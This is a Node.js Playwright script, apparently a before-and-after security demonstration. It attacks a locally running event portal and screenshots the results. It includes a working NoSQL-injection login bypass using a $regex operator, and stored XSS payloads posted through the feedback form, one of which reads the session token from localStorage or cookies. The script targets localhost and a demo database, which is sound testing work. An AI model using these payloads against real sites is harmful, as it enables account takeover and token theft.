// Attacks a locally running copy of the portal and screenshots the result.
//   node security-demo.mjs <stage>      stage = before | after
// Expects: API on http://localhost:5000, React dev server on http://localhost:5173,
// an admin seeded as admin@techfest.local / Admin@123 (demo database only).
import { chromium } from "playwright";
import { mkdirSync, writeFileSync } from "node:fs";
import { terminalShot, curlLike } from "./term.mjs";

const stage = process.argv[2] || "before";
const API = "http://localhost:5000";
const WEB = "http://localhost:5173";
const OUT = `${process.env.GITHUB_WORKSPACE || "."}/evidence/security`;
mkdirSync(OUT, { recursive: true });

const browser = await chromium.launch();
const json = (body) => ({ method: "POST", headers: { "Content-Type": "application/json", Origin: WEB }, body: JSON.stringify(body) });
const log = {};

// ---------- 1. Security headers ----------
{
  const res = await fetch(`${API}/api/health`);
  const lines = ["$ curl -i http://localhost:5000/api/health", ...(await curlLike(res, {
    headers: ["content-type", "content-security-policy", "strict-transport-security", "x-content-type-options", "x-frame-options", "x-powered-by"],
  }))];
  log.headers = lines;
  await terminalShot(browser, `${OUT}/headers-${stage}.png`, `Response headers — ${stage} fix`, lines);
}

// ---------- 2. NoSQL injection login bypass ----------
{
  const body = { email: { $regex: ".*" }, password: "Admin@123" };
  const res = await fetch(`${API}/api/auth/login`, json(body));
  const lines = [
    "# Attacker does not know any email address. $regex \".*\" matches the FIRST user (the admin)",
    `$ curl -i -X POST http://localhost:5000/api/auth/login -H "Content-Type: application/json" -d '${JSON.stringify(body)}'`,
    ...(await curlLike(res, { headers: ["content-type", "set-cookie"] })),
  ];
  log.injection = { status: res.status, lines };
  await terminalShot(browser, `${OUT}/injection-${stage}.png`, `NoSQL injection login — ${stage} fix`, lines);
}

// ---------- 3. Stored XSS through the feedback form ----------
const student = { name: "Demo Student", email: "student.demo@test.com", password: "Student123" };
await fetch(`${API}/api/auth/register`, json(student));

const page = await browser.newPage({ viewport: { width: 1280, height: 860 } });
let alertText = null;
page.on("dialog", async (d) => {
  alertText = d.message();
  await d.dismiss();
});

// Victim logs in through the real login page
await page.goto(`${WEB}/login`);
await page.fill('input[type="email"]', student.email);
await page.fill('input[type="password"]', student.password);
const [loginRes] = await Promise.all([
  page.waitForResponse((r) => r.url().includes("/api/auth/login")),
  page.click("form button"),
]);
await page.waitForURL(/events/, { timeout: 10000 }).catch(() => {});
log.loginSetCookie = (await loginRes.allHeaders())["set-cookie"] || "(none)";
log.loginBodyHasToken = "token" in (await loginRes.json());

// Attacker posts two payloads: the manual's <script> and an <img onerror> that steals the token
const payloadScript = "<script>alert('hi')</script>";
const payloadImg =
  `<img src=x onerror="document.body.insertAdjacentHTML('afterbegin','<div style=\\'position:fixed;top:0;left:0;right:0;z-index:999;background:#c62828;color:#fff;padding:14px 18px;font:15px monospace\\'>XSS EXECUTED - stolen token: '+(localStorage.getItem('token')||document.cookie||'(nothing readable)').slice(0,60)+'...</div>')">`;
await fetch(`${API}/api/feedback`, json({ name: "Attacker", message: payloadScript }));
await fetch(`${API}/api/feedback`, json({ name: "Attacker", message: payloadImg }));

await page.goto(`${WEB}/contact`);
await page.waitForSelector("#feedback-list li", { timeout: 15000 });
await page.waitForTimeout(1500);
await page.screenshot({ path: `${OUT}/xss-${stage}.png` });

// What JavaScript on the page can read (this is what an XSS payload could steal)
log.readable = await page.evaluate(() => ({
  localStorageToken: localStorage.getItem("token"),
  documentCookie: document.cookie,
}));
log.alertFired = alertText;
log.xssBannerShown = await page.locator("text=XSS EXECUTED").count();

// ---------- 4. Where is the token? (cookie flags / storage) ----------
{
  const lines = [
    "# Login response",
    `set-cookie: ${log.loginSetCookie}`,
    `token in JSON body: ${log.loginBodyHasToken}`,
    "",
    "# What page JavaScript (or an injected script) can read:",
    `> localStorage.getItem("token")`,
    `${log.readable.localStorageToken ? log.readable.localStorageToken.slice(0, 70) + "…" : "null"}`,
    `> document.cookie`,
    `"${log.readable.documentCookie}"`,
    "",
    `# XSS banner rendered on /contact: ${log.xssBannerShown > 0 ? "YES — script ran" : "no — payload shown as plain text"}`,
  ];
  await terminalShot(browser, `${OUT}/token-storage-${stage}.png`, `Token storage and cookie flags — ${stage} fix`, lines);
}

writeFileSync(`${OUT}/result-${stage}.json`, JSON.stringify(log, null, 2));
console.log(JSON.stringify({ stage, injectionStatus: log.injection.status, xssBanner: log.xssBannerShown, alert: log.alertFired, readable: log.readable }, null, 2));
await browser.close();
